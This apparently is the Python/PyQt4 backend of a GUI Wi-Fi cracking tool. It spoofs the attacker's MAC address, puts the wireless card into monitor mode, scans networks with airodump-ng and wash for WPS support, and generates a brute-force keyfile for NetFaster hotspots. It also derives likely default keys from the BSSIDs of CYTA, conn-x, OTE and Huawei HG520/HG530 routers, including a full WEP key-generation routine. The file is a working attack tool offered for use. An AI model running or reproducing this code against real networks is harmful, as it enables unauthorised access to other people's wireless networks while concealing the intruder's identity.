import subprocess
import os
import commands
import time
import re
import fileinput
import random

from threading import Thread
from PyQt4 import QtGui, QtCore


class RetardedKill(Thread):
    def __init__ (self, prog, sec):
        Thread.__init__(self)
        self.prog = prog
        self.sec  = sec

    def run(self):
        time.sleep(self.sec)
        status = commands.getstatusoutput("killall " + self.prog)
        # if status[0] != 0: 
        #     print status
        #     print 'Something went wrong when try to stop the process ' + self.prog
        # else:
        #     print self.prog + ' stoped successfully'

class Command_thread(Thread):
    def __init__ (self, command, use_term = True, callback = None):
        Thread.__init__(self)
        self.command = command
        self.use_term = use_term
        self.callback = callback

    def run(self):

        # exec command
        print (self.command)

        # use terminal emulator?
        if self.use_term:
            commands.getstatusoutput('xterm' + " -e 'bash -c \"" + self.command + "; read; \"'")
        
        else:
            commands.getstatusoutput(self.command)
            
        # callback
        if hasattr(self.callback, '__call__'):
           self.callback()

def output(self, out_text, exit_code):
    # print the output in the text_output widget (QTextEdit)
    # success
    if exit_code==0:
        self.text_output.append( '<b>' + time.strftime("%H:%M:%S", time.localtime()) + '</b> - ' + out_text + ' [<font color="#00aa00">Success</font>]')
     # failure
    else:
        self.run_problem = True
        self.text_output.append( '<b>' + time.strftime("%H:%M:%S", time.localtime()) + '</b> - ' + out_text + ' [<font color="#ff0000">Failure</font>]')
    time.sleep(0.1)
    QtGui.QApplication.processEvents() # to make the programm run smoothly and not freeze

def direct_output(self, out_text):
        # print the output in the text_output widget (QTextEdit)
        self.text_output.append( '<b>' + time.strftime("%H:%M:%S", time.localtime()) + '</b> - ' + out_text)
        time.sleep(0.1)
        QtGui.QApplication.processEvents() # to make the programm run smoothly and not freeze



def install_aircrack():
    direct_output(self, "Aircrack suit isn't installed in our machine.")
    direct_output(self, "Now we are going to install aircrack-ng.")
    status = commands.getstatusoutput('apt-get install aircrack-ng')
    time.sleep(15) 
    if status[0] != 0:
        output(self, 'Aircrack installation process ended with : ', 1)
    else:
        output(self, 'Aircrack installation process ended with : ', 1)
    
    

def aircrack_exist(self):
    try:
        devnull = open(os.devnull)
        subprocess.Popen("aircrack-ng", stdout=devnull, stderr=devnull).communicate() # try to find if airackrack is installed in our machine
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            direct_output(self,'Aircrack suit could not located on our machine. We are going to install it.')
            return False # it isn't installed
    direct_output(self,'Aircrack suit located on our machine.')
    return True # it is installed



def stop_network_manager(self):
    status = commands.getstatusoutput('service network-manager stop')
    if status[0] != 0: 
        output(self,'Network Manager stop process: ',1)
    else:
        output(self,'Network Manager stop process: ',0)
    

def start_network_manager(self):
    status = commands.getstatusoutput('service network-manager start')
    if status[0] != 0: 
        output(self,'Network Manager start process: ',1)
    else:
        output(self,'Network Manager start process: ',0)

def get_wireless_card(self):
    variables = list()
    with open('variables.txt', 'r') as f:
        variables = f.readlines()
    wicard = variables[2].split('|')
    if wicard[1][0:-1]:
        airmon = commands.getoutput("airmon-ng | egrep -e '^[a-z]{2,4}[0-9]'")
        airmon = airmon.split('\n')
        device_interface = list()
        for interface in airmon:
            if interface == "":
                    continue
            elif interface[0:3] == 'mon':
                tmp_inteface = interface.split('\t')
                direct_output(self, "Found enable monitor mode: " + str(tmp_inteface[0]))
                direct_output(self, "We are going to remove it")
                disable_monitor_mode(self,tmp_inteface[0])
        direct_output(self, "Device interface we using is: " + str(wicard[1][0:-1]))
        return str(wicard[1][0:-1])
    else:
        airmon = commands.getoutput("airmon-ng | egrep -e '^[a-z]{2,4}[0-9]'")

        airmon = airmon.split('\n')
        device_interface = list()
        for interface in airmon:
            if interface == "":
                    continue
            elif interface[0:3] == 'mon':
                tmp_inteface = interface.split('\t')
                direct_output(self, "Found enable monitor mode: " + str(tmp_inteface[0]))
                direct_output(self, "We are going to remove it")
                disable_monitor_mode(self,tmp_inteface[0])
            elif interface[0:4] == 'wlan':
                device_interface = interface.split('\t')
        direct_output(self, "Device interface we using is: " + str(device_interface[0]))
        return device_interface[0]


def get_device_mac(self, device_interface):
    current_mac = commands.getoutput("ifconfig " + device_interface + " | grep HWaddr | awk ' { print $5 } ' | tr '-' ':'")
    current_mac = current_mac[:17]
    return current_mac

def enable_monitor_mode(self, device_interface):
    status = commands.getstatusoutput('airmon-ng start ' + device_interface)
    if status[0] != 0:
        output(self, "Setting device " + str(device_interface) + "into Monitor mode: ", 1) 
    else:
        output(self, "Setting device " + str(device_interface) + "into Monitor mode: ", 0) 

def disable_monitor_mode(self, device_interface):
    command = 'airmon-ng stop ' + device_interface
    status = commands.getstatusoutput(str(command))
    if status[0] != 0:
        output(self, "Setting device " + str(device_interface) + "into Managed mode: ", 1) 
    else:
        output(self, "Setting device " + str(device_interface) + "into Managed mode: ", 0) 

def scan_for_networks(self):

    direct_output(self, '-----Now we\'re going to scan for avaible networks-----')
    scan_command = 'airodump-ng --output-format csv,cap --write wifi-scan mon0'
    sec = 10 
    thr = RetardedKill("airodump-ng", sec)
    thr.start()


    status = commands.getstatusoutput(scan_command)
    for ti in xrange(0, sec):
        time.sleep(0.3)
        QtGui.QApplication.processEvents() # to make the programm run smoothly and not freeze
    time.sleep(0.1)
    QtGui.QApplication.processEvents() # to make the programm run smoothly and not freeze


    if status[0] != 0:
        output(self, "Network scanning process: ", 1) 
    else:
        output(self, "Network scanning process: ", 0) 

    output_raw = commands.getoutput('cat wifi-scan*.csv')

    scan_output     = output_raw.splitlines()

    return scan_output

def parse_output(self, scan_output):
    assossiate = False
   
    order_id=0

    for out in scan_output:
        time.sleep(0.1)
        QtGui.QApplication.processEvents() # to make the programm run smoothly and not freeze

        if not out:
            continue
        else:
            new_lst = out.split(',')
            if new_lst[0] == 'BSSID': #station info header, we don't need it
                continue
            elif new_lst[0] == 'Station MAC': #now we save the assossiate client
                assossiate = True
                continue
            elif assossiate == True:
                #print "Now we print the clients"
                #print "Station with bssid " + new_lst[0] + " is connected to " + new_lst[5]
                self.assossiate_dict.update({new_lst[5].strip() : new_lst[0]})
                #print  self.assossiate_dict

                # We going to find in which table BSSID index we need to add the station value
                # from the dictionary

                for row in xrange(0, order_id):
                    time.sleep(0.1)
                    QtGui.QApplication.processEvents() # to make the programm run smoothly and not freeze

                    AP = str(self.table_networks.item(row,1).text())
                    if self.assossiate_dict.has_key(AP):
                        #print "Station with bssid " + AP + " is connected to " + self.assossiate_dict[AP]
                        item=QtGui.QTableWidgetItem()
                        item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                        item.setText(self.assossiate_dict[AP])
                        self.table_networks.setItem(row, 8,item)

                wps_support = False
                wash_command = 'wash -f wifi-scan*.cap -o wash.out'
                status = commands.getstatusoutput(wash_command)

                with open('wash.out') as f:
                    content = f.readlines()

                networks = list()
                data = list()

                for info in content[2:]:
                    if not info == '\n':
                        networks.append(info)

                if not not networks:
                    for info in networks:
                        data = info.split(' ')
                        if data[0] == bssid and data[25].strip() == "No":
                            wps_support = True
                        data[:] = []

                if wps_support == True:
                    item=QtGui.QTableWidgetItem()
                    item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                    item.setText('YES')
                    self.table_networks.setItem(order_id, 9,item)
                else:
                    item=QtGui.QTableWidgetItem()
                    item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                    item.setText('NO')
                    self.table_networks.setItem(order_id, 9,item)

                with open('keys.lst', 'r') as f:
                    for line in f:
                        network = line.split('|')
                        if network[0] == bssid:
                            item=QtGui.QTableWidgetItem()
                            item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                            item.setText('YES' )
                            self.table_networks.setItem(order_id, 10,item)
                    else:
                        item=QtGui.QTableWidgetItem()
                        item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                        item.setText('NO' )
                        self.table_networks.setItem(order_id, 10,item)

            else: #we get the output of the network

                bssid = new_lst[0].strip() #strip is used to remove whitespaces in the begining of the stings
                channel = new_lst[3].strip()
                mb = new_lst[4].strip()
                enc = new_lst[5].strip()
                cipher = new_lst[6].strip()
                auth = new_lst[7].strip()
                pwr = new_lst[8].strip().replace('-', '') + ' db'
                essid = new_lst[13].strip()


                self.table_networks.insertRow(order_id)
                item=QtGui.QTableWidgetItem()
                item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                item.setText(QtGui.QApplication.translate("Main_window", essid, None, QtGui.QApplication.UnicodeUTF8))
                self.table_networks.setItem(order_id, 0,item )
                item=QtGui.QTableWidgetItem(bssid)
                item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                item.setText(bssid)
                self.table_networks.setItem(order_id, 1,item)
                
                item=QtGui.QTableWidgetItem()
                item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                item.setText(channel)
                self.table_networks.setItem(order_id, 2,item)
                
                item=QtGui.QTableWidgetItem()
                item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                item.setText(pwr)
                self.table_networks.setItem(order_id, 3,item)
                
                item=QtGui.QTableWidgetItem()
                item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                item.setText(enc)
                self.table_networks.setItem(order_id, 4, item)

                item=QtGui.QTableWidgetItem()
                item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                item.setText(cipher)
                self.table_networks.setItem(order_id, 5, item)

                item=QtGui.QTableWidgetItem()
                item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                item.setText(auth)
                self.table_networks.setItem(order_id, 6, item)

                item=QtGui.QTableWidgetItem()
                item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                item.setText(mb)
                self.table_networks.setItem(order_id, 7, item)

                item=QtGui.QTableWidgetItem()
                item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                item.setText('NO')
                self.table_networks.setItem(order_id, 8,item)

                wps_support = False
                wash_command = 'wash -f wifi-scan*.cap -o wash.out'
                status = commands.getstatusoutput(wash_command)

                with open('wash.out') as f:
                    content = f.readlines()

                networks = list()
                data = list()

                for info in content[2:]:
                    if not info == '\n':
                        networks.append(info)

                if not not networks:
                    for info in networks:
                        data = info.split(' ')
                        if data[0] == bssid and data[25].strip() == "No":
                            wps_support = True
                        data[:] = []

                if wps_support == True:
                    item=QtGui.QTableWidgetItem()
                    item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                    item.setText('YES')
                    self.table_networks.setItem(order_id, 9,item)
                else:
                    item=QtGui.QTableWidgetItem()
                    item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                    item.setText('NO')
                    self.table_networks.setItem(order_id, 9,item)

                with open('keys.lst', 'r') as f:
                    for line in f:
                        network = line.split('|')
                        if network[0] == bssid:
                            item=QtGui.QTableWidgetItem()
                            item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                            item.setText('YES' )
                            self.table_networks.setItem(order_id, 10,item)
                    else:
                        item=QtGui.QTableWidgetItem()
                        item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsEnabled)
                        item.setText('NO' )
                        self.table_networks.setItem(order_id, 10,item)

                order_id=order_id+1


   

                self.table_networks.clearSelection()
                #commands.getstatusoutput('rm wifi-scan*')
                #commands.getstatusoutput('rm wash.out')


def generate_NetFaster_keyfile(self, bssid):
    keyfile = open("netfasterkeys.txt", "w")
    hotspot = str('000559' + bssid[9:17].replace(':', '') + '-')
    for num in xrange(0, 10000):
        num = str(num)
        while len(num) < 4:
            num = '0' + num
        keyfile.write(hotspot + num + '\n')
    keyfile.close()

def rescan(self):
    # clear table
    for i in range(self.table_networks.rowCount(), -1, -1):
        self.table_networks.removeRow(i)
        time.sleep(0.1)
        QtGui.QApplication.processEvents() # to make the programm run smoothly and not freeze



    direct_output(self, 'We have removed past indeces from the table.')
    self.statusBar().showMessage('Rescanning Networks')

    if self.reset_process_is_pressed:
        first_scan(self)
    else:
        #disable_monitor_mode('mon0')
        #enable_monitor_mode(self.device_interface)
        self.scan_output = scan_for_networks(self)                                   #[SUCCESS]

        parse_output(self, self.scan_output)                                         #[SUCCESS]
        self.button_rescan_networks.setEnabled(True)
        self.button_attack.setEnabled(True)

def get_mac_info():
    # We read the list file and choose a random vendor
    total_bytes = os.stat('ouis.lst').st_size 
    random_point = random.randint(0, total_bytes)
    file = open('ouis.lst')
    file.seek(random_point)
    file.readline() # skip this line to clear the partial line
    line = file.readline()
    mac_vendor = line[0:8] # These are the first three bytes of mac adress
    vendor_info = line[9: -1] # info about the company who owns the vendor
    mac_vendor = mac_vendor.replace(' ',':')
    mac_serial = str()

    # We get the last three bytes randomly
    for byte in range(0,3):
        byte = random.randint(0, 99)
        two_digit = str()
        if 0 <= byte <= 9:
            two_digit = str(random.randint(0, 9)) + str(byte)
        else:
            two_digit = str(byte)
        mac_serial =  mac_serial + ':' + two_digit


    mac_adress = (mac_vendor + mac_serial).replace('[', '').replace('\'', '').replace(']', '')


    mac_info = [mac_adress, vendor_info] # list with mac adress and vendor info
    return mac_info


def change_mac_adress(self, device_interface):
    # We can get the real mac adress of our wireless card running
    # the function get_device_mac(device_interface) line 289,
    # but it's better to change our mac to some other value
    # That's whaw this function does

    variables = list()
    mac_info = list()
    with open('variables.txt', 'r') as f:
        variables = f.readlines()
    mac_vendor = variables[0].split('|')
    mac_serial = variables[1].split('|')

    if mac_vendor[1][0:-1] and mac_serial[1][0:-1]:
        macv = mac_vendor[1][0:2] + ':' + mac_vendor[1][2:4] + ':' + mac_vendor[1][4:-1]
        macs = mac_serial[1][0:2] + ':' + mac_serial[1][2:4] + ':' + mac_serial[1][4:-1]
        mac_info.append(str(macv) + ':' + str(macs))
        mac_info.append('User defined')
        print mac_info
    elif mac_vendor[1][0:-1]:
        mac_v = str()
        macv = mac_vendor[1][0:2] + ':' + mac_vendor[1][2:4] + ':' + mac_vendor[1][4:-1]
        # We get the last three bytes randomly
        for byte in range(0,3):
            byte = random.randint(0, 99)
            two_digit = str()
            if 0 <= byte <= 9:
                two_digit = str(random.randint(0, 9)) + str(byte)
            else:
                two_digit = str(byte)
            mac_v =  mac_v + ':' + two_digit
        mac_v = macv + mac_v
        print mac_v
        mac_info.append(str(mac_v))
        mac_info.append('User defined')
        print mac_info
    elif mac_serial[1][0:-1]:
        mac_s = str()
        macs = mac_serial[1][0:2] + ':' + mac_serial[1][2:4] + ':' + mac_serial[1][4:-1]
        # We get the last three bytes randomly
        for byte in range(0,3):
            byte = random.randint(0, 99)
            two_digit = str()
            if 0 <= byte <= 9:
                two_digit = str(random.randint(0, 9)) + str(byte)
            else:
                two_digit = str(byte)
            mac_s =  mac_s + ':' + two_digit
        mac_s = mac_s[1:] + ':' + macs
        print mac_s
        mac_info.append(str(mac_s))
        mac_info.append('User defined')
        print mac_info

    else:
        mac_info = get_mac_info()

    direct_output(self, 'Our true mac is: ' + str(self.true_mac))

    interface_down = 'ifconfig ' + device_interface + ' down'
    statusin = commands.getstatusoutput(interface_down)

    if statusin[0] != 0:
        output(self, 'Taking interface ' + str(device_interface) + ' down: ', 1)
    else:
        output(self, 'Taking interface ' + str(device_interface) + ' down: ', 0)


    changemac = 'ifconfig ' + device_interface + ' hw ether ' + mac_info[0]
    statuscm = commands.getstatusoutput(changemac)
    print statuscm
    if statuscm[0] != 0:
        output(self, 'Changing mac adress on device ' + str(device_interface) + ': ', 1) 
    else:
        output(self, 'Changing mac adress on device ' + str(device_interface) + ': ', 0)
        direct_output(self, 'New device mac adress is: ' + str(get_device_mac(self, device_interface)) + ' : ' + '<b>' + mac_info[1] + '</b>')

    interface_up = 'ifconfig ' + device_interface + ' up'
    statusiu = commands.getstatusoutput(interface_up)

    if statusiu[0] != 0:
        output(self, 'Taking interface ' + str(device_interface) + ' up: ', 1)
    else:
        output(self, 'Taking interface ' + str(device_interface) + ' up: ', 0)

    mac = get_device_mac(self, device_interface)
    return mac


def first_scan(self):
    # check if we have aircrack suit installed on our machine               #[SUCCESS]
    # if we don't then we install it
    if bool(aircrack_exist(self)) == False:
        install_aircrack(self)

    #init_config_dir()                                                      #[SUCCESS]
    stop_network_manager(self) # we stop network manager to avoid errors        #[SUCCESS]
    self.device_interface = get_wireless_card(self)                             #[SUCCESS]
    self.true_mac = get_device_mac(self, self.device_interface)
    self.device_mac = change_mac_adress(self, self.device_interface)              #[SUCCESS]    
    enable_monitor_mode(self, self.device_interface)                              #[SUCCESS]
    self.scan_output = scan_for_networks(self)                                   #[SUCCESS] 
    parse_output(self, self.scan_output)                                         #[SUCCESS]
    self.start_procedure_is_pressed = True
    self.button_rescan_networks.setEnabled(True)
    self.button_rescan_networks.setText("Make a new Scan")
    self.button_attack.setEnabled(True)
    self.reset_process_is_pressed = False

def check_wpa_essid(self):
    if self.essid[0:5] == 'CYTA':
        direct_output(self, 'You can make a Cyta password recovery')
        self.w.show()
                
    elif self.essid[0:9] == 'NetFaster':
        direct_output(self, 'You can make a NetFaster password recovery')
        self.w.show()
    elif self.essid[0:8] == 'Thomson' or self.essid[0:10] == 'speedtouch':
        widget = QWidget()
        QtGui.QMessageBox.about(widget, "Thomson Network", "Thomnson crack not implemented yet")
        #direct_output(self, 'Thomnson crack not Implemented yet')
                
    elif self.essid[0:6] == 'conn-x':
        if self.essid[6:12] == self.bssid[9:17].replace(':','').lower():
            direct_output(self, '\nPossible key is ' + '<b>' + self.bssid.replace(':','').lower() + '</b>')
            #print 'key is ' + self.bssid.replace(':','').lower()
        direct_output(self, 'A possible option is that key ' + '<b>' + '1234567890123' + '</b>')
        direct_output(self, 'Another option is ' + '<b>' + '0' + self.bssid.replace(':','').lower() + '</b>')
        #print 'try that key too ' + '1234567890123'
        #print 'try that key too' + '0' + self.bssid.replace(':','').lower()


    elif self.essid[0:4] ==  'OTE':
        direct_output(self, '\nPossible options follow...')
        if self.essid[4:11] == self.bssid[9:17].replace(':','').tolower():
            direct_output(self, '\nPossible key is ' + '<b>' + self.bssid.replace(':','').lower() + '</b>')
            #print 'key is ' + self.bssid.replace(':','').lower()
        direct_output(self, 'A possible option is that key ' + '<b>' + '1234567890123' + '</b>')
        #print 'An option too is  ' + '1234567890123'
        direct_output(self, 'Another option is ' + '<b>' + '0' + self.bssid.replace(':','').lower() + '</b>')
        #print 'try that key too' + '0' + self.bssid.replace(':','').lower()
        direct_output(self, 'A few more possible options follow:')
        #print 'a few more options available next'
        direct_output(self, '<b>' + "c87b5b" + str(self.essid[4:11]) + '</b>')
        direct_output(self, '<b>' + "fcc897" + str(self.essid[4:11]) + '</b>')
        direct_output(self, '<b>' + "681ab2" + str(self.essid[4:11]) + '</b>')
        direct_output(self, '<b>' + "b075d5" + str(self.essid[4:11]) + '</b>')
        direct_output(self, '<b>' + "384608" + str(self.essid[4:11]) + '</b>')


    elif self.essid[0:9] == 'INFINITUM':
        direct_output(self, '\nIf router is model HG520 or HG530 we have one option. Please wait...')
        direct_output(self, 'Here it is ' + '<b>' + try_huawei_crack(self.bssid) + '</b>')

    else:
        direct_output(self, 'Couldn\'t find known network. We can get Handshake though!')
        self.w.show()



def exit_procedure(self):
                disable_monitor_mode(self, 'mon0')                                            #[SUCCESS]
                
                #return mac to true mac
                interface_down = 'ifconfig ' + self.device_interface + ' down'
                statusin = commands.getstatusoutput(interface_down)

                if statusin[0] != 0:
                    output(self, 'Taking interface ' + str(self.device_interface) + ' down: ', 1)
                else:
                    output(self, 'Taking interface ' + str(self.device_interface) + ' down: ', 0)

                changemac = 'ifconfig ' + self.device_interface + ' hw ether ' + self.true_mac
                statuscm = commands.getstatusoutput(changemac)

                if statuscm[0] != 0:
                    output(self, 'Changing to true mac adress on device ' + str(self.device_interface) + ': ', 1) 
                else:
                    output(self, 'Changing to true mac adress on device ' + str(self.device_interface) + ': ', 0)
                    direct_output(self, 'Returning mac adress ' + self.true_mac + ' to device.')

                interface_up = 'ifconfig ' + self.device_interface + ' up'
                statusiu = commands.getstatusoutput(interface_up)

                if statusiu[0] != 0:
                    output(self, 'Taking interface ' + str(self.device_interface) + ' up: ', 1)
                else:
                    output(self, 'Taking interface ' + str(self.device_interface) + ' up: ', 0)

                start_network_manager(self)                                                 #[SUCCESS]
                commands.getstatusoutput('rm wifi-scan*')
                commands.getstatusoutput('rm output*')
                commands.getstatusoutput('rm wash.csv')
                commands.getstatusoutput('rm netfasterkeys.txt')
                commands.getstatusoutput('rm wash.out')
                commands.getstatusoutput('rm variables.txt')
                if self.run_problem:
                    direct_output(self, 'Program ended-----')
                    time_now = time.strftime("%H:%M:%S", time.localtime())
                    date_now = time.strftime("%d-%m-%Y")
                    log_name = date_now + '_' + time_now + '.txt'
                    with open('Logs/' + log_name, 'w') as fl:
                        fl.write(str(self.text_output.toPlainText()))


def hex2dec(s):
    return int(s, 16)


def try_huawei_crack(bssid):
    i=0;mac=[]
    a0=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    a1=0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
    a2=0,13,10,7,5,8,15,2,10,7,0,13,15,2,5,8
    a3=0,1,3,2,7,6,4,5,15,14,12,13,8,9,11,10
    a4=0,5,11,14,7,2,12,9,15,10,4,1,8,13,3,6
    a5=0,4,8,12,0,4,8,12,0,4,8,12,0,4,8,12
    a6=0,1,3,2,6,7,5,4,12,13,15,14,10,11,9,8
    a7=0,8,0,8,1,9,1,9,2,10,2,10,3,11,3,11
    a8=0,5,11,14,6,3,13,8,12,9,7,2,10,15,1,4
    a9=0,9,2,11,5,12,7,14,10,3,8,1,15,6,13,4
    a10=0,14,13,3,11,5,6,8,6,8,11,5,13,3,0,14
    a11=0,12,8,4,1,13,9,5,2,14,10,6,3,15,11,7
    a12=0,4,9,13,2,6,11,15,4,0,13,9,6,2,15,11
    a13=0,8,1,9,3,11,2,10,6,14,7,15,5,13,4,12
    a14=0,1,3,2,7,6,4,5,14,15,13,12,9,8,10,11
    a15=0,1,3,2,6,7,5,4,13,12,14,15,11,10,8,9
    n1=0,14,10,4,8,6,2,12,0,14,10,4,8,6,2,12
    n2=0,8,0,8,3,11,3,11,6,14,6,14,5,13,5,13
    n3=0,0,3,3,2,2,1,1,4,4,7,7,6,6,5,5
    n4=0,11,12,7,15,4,3,8,14,5,2,9,1,10,13,6
    n5=0,5,1,4,6,3,7,2,12,9,13,8,10,15,11,14
    n6=0,14,4,10,11,5,15,1,6,8,2,12,13,3,9,7
    n7=0,9,0,9,5,12,5,12,10,3,10,3,15,6,15,6
    n8=0,5,11,14,2,7,9,12,12,9,7,2,14,11,5,0
    n9=0,0,0,0,4,4,4,4,0,0,0,0,4,4,4,4
    n10=0,8,1,9,3,11,2,10,5,13,4,12,6,14,7,15
    n11=0,14,13,3,9,7,4,10,6,8,11,5,15,1,2,12
    n12=0,13,10,7,4,9,14,3,10,7,0,13,14,3,4,9
    n13=0,1,3,2,6,7,5,4,15,14,12,13,9,8,10,11
    n14=0,1,3,2,4,5,7,6,12,13,15,14,8,9,11,10
    n15=0,6,12,10,9,15,5,3,2,4,14,8,11,13,7,1
    n16=0,11,6,13,13,6,11,0,11,0,13,6,6,13,0,11
    n17=0,12,8,4,1,13,9,5,3,15,11,7,2,14,10,6
    n18=0,12,9,5,2,14,11,7,5,9,12,0,7,11,14,2
    n19=0,6,13,11,10,12,7,1,5,3,8,14,15,9,2,4
    n20=0,9,3,10,7,14,4,13,14,7,13,4,9,0,10,3
    n21=0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15
    n22=0,1,2,3,5,4,7,6,11,10,9,8,14,15,12,13
    n23=0,7,15,8,14,9,1,6,12,11,3,4,2,5,13,10
    n24=0,5,10,15,4,1,14,11,8,13,2,7,12,9,6,3
    n25=0,11,6,13,13,6,11,0,10,1,12,7,7,12,1,10
    n26=0,13,10,7,4,9,14,3,8,5,2,15,12,1,6,11
    n27=0,4,9,13,2,6,11,15,5,1,12,8,7,3,14,10
    n28=0,14,12,2,8,6,4,10,0,14,12,2,8,6,4,10
    n29=0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3
    n30=0,15,14,1,12,3,2,13,8,7,6,9,4,11,10,5
    n31=0,10,4,14,9,3,13,7,2,8,6,12,11,1,15,5
    n32=0,10,5,15,11,1,14,4,6,12,3,9,13,7,8,2
    n33=0,4,9,13,3,7,10,14,7,3,14,10,4,0,13,9
    key=30,31,32,33,34,35,36,37,38,39,61,62,63,64,65,66
    ssid=[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']

    mac2= bssid.replace(':','')

    while i<12:
       mac.insert(i,hex2dec(mac2[i])); i=i+1

    s1=(n1[mac[0]])^(a4[mac[1]])^(a6[mac[2]])^(a1[mac[3]])^(a11[mac[4]])^(n20[mac[5]])^(a10[mac[6]])^(a4[mac[7]])^(a8[mac[8]])^(a2[mac[9]])^(a5[mac[10]])^(a9[mac[11]])^5
    s2=(n2[mac[0]])^(n8[mac[1]])^(n15[mac[2]])^(n17[mac[3]])^(a12[mac[4]])^(n21[mac[5]])^(n24[mac[6]])^(a9[mac[7]])^(n27[mac[8]])^(n29[mac[9]])^(a11[mac[10]])^(n32[mac[11]])^10
    s3=(n3[mac[0]])^(n9[mac[1]])^(a5[mac[2]])^(a9[mac[3]])^(n19[mac[4]])^(n22[mac[5]])^(a12[mac[6]])^(n25[mac[7]])^(a11[mac[8]])^(a13[mac[9]])^(n30[mac[10]])^(n33[mac[11]])^11
    s4=(n4[mac[0]])^(n10[mac[1]])^(n16[mac[2]])^(n18[mac[3]])^(a13[mac[4]])^(n23[mac[5]])^(a1[mac[6]])^(n26[mac[7]])^(n28[mac[8]])^(a3[mac[9]])^(a6[mac[10]])^(a0[mac[11]])^10
    ya=(a2[mac[0]])^(n11[mac[1]])^(a7[mac[2]])^(a8[mac[3]])^(a14[mac[4]])^(a5[mac[5]])^(a5[mac[6]])^(a2[mac[7]])^(a0[mac[8]])^(a1[mac[9]])^(a15[mac[10]])^(a0[mac[11]])^13
    yb=(n5[mac[0]])^(n12[mac[1]])^(a5[mac[2]])^(a7[mac[3]])^(a2[mac[4]])^(a14[mac[5]])^(a1[mac[6]])^(a5[mac[7]])^(a0[mac[8]])^(a0[mac[9]])^(n31[mac[10]])^(a15[mac[11]])^4
    yc=(a3[mac[0]])^(a5[mac[1]])^(a2[mac[2]])^(a10[mac[3]])^(a7[mac[4]])^(a8[mac[5]])^(a14[mac[6]])^(a5[mac[7]])^(a5[mac[8]])^(a2[mac[9]])^(a0[mac[10]])^(a1[mac[11]])^7
    yd=(n6[mac[0]])^(n13[mac[1]])^(a8[mac[2]])^(a2[mac[3]])^(a5[mac[4]])^(a7[mac[5]])^(a2[mac[6]])^(a14[mac[7]])^(a1[mac[8]])^(a5[mac[9]])^(a0[mac[10]])^(a0[mac[11]])^14
    ye=(n7[mac[0]])^(n14[mac[1]])^(a3[mac[2]])^(a5[mac[3]])^(a2[mac[4]])^(a10[mac[5]])^(a7[mac[6]])^(a8[mac[7]])^(a14[mac[8]])^(a5[mac[9]])^(a5[mac[10]])^(a2[mac[11]])^7

    WEP = str(key[ya])+str(key[yb])+str(key[yc])+str(key[yd])+str(key[ye])
    return WEP 
